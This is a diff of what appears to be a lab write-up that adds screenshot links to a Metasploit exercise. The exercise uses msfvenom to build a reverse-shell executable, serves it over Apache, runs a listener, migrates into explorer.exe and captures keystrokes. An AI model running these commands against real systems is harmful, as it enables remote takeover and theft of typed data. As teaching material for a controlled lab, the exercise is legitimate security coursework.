@@ -25,37 +25,37 @@ Open terminal and try execute some kali linux commands
 
 Find the attackers ip address using ifconfig
 ## OUTPUT:
-
+![Alt text](img/1.png)
 
 
 Create a malicious executable file fun.exe using msfvenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 ## OUTPUT:
-
+![Alt text](img/2.png)
 
 copy the fun.exe into the apache /var/www/html folder
 ## OUTPUT:
-
+![Alt text](img/3.png)
 
 Start apache server
 sudo systemctl apache2 start
 ## OUTPUT:
-
+![Alt text](img/4.png)
 
 Check the status of apache2
 ## OUTPUT:
-
+![Alt text](img/5.png)
 
 
 Invoke msfconsole:
 ## OUTPUT:
-
+![Alt text](img/6.png)
 
 
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 ## OUTPUT:
-
+![Alt text](img/7.png)
 
 
 Starting a command and control Server
@@ -64,7 +64,7 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 
 ## OUTPUT:
-
+![Alt text](img/8.png)
 
 
 
@@ -72,14 +72,10 @@ On the target Windows machine, open a Web browser and open this URL, replacing t
 http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
 The file "fun.exe" downloads. 
 ## OUTPUT:
-
+![Alt text](img/9.png)
 
 
 Bypass any warning boxes, double-click the file, and allow it to run.
-## OUTPUT:
-
-
-
 On kali/parrot give the command exploit
 ## OUTPUT:
 
@@ -88,7 +84,7 @@ On kali/parrot give the command exploit
 To see a list of processes, at the meterpreter > prompt, execute this command:
 ps  ⇒ can see the fun.exe process running with pid 1156
 ## OUTPUT:
-
+![Alt text](img/10.png)
 
 
 The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
@@ -98,31 +94,28 @@ At the meterpreter > prompt, execute this command:
 
 migrate -N explorer.exe
 ## OUTPUT:
-
+![Alt text](img/11.png)
 
 at meterpreter > prompt, execute this command:
 netstat
 A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
 Notice the "PID/Program name" value for this connection, which is redacted 
-## OUTPUT:
 
 
 
 Post Exploitation
 The target is now owned. Following are meterpreter commands for key capturing in the target machine
 keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
-## OUTPUT:
-
 
 
 
 keyscan_dump	Shows the keystrokes captured so far
 ## OUTPUT:
-
+![Alt text](img/12.png)
 
 ## RESULT:
 The Metasploit framework is  used to compromise windows and is examined successfully.
-
+![Alt text](img/13.png)
 
 ## RESULT:
 The Metasploit framework is  used to compromise windows and is examined successfully.
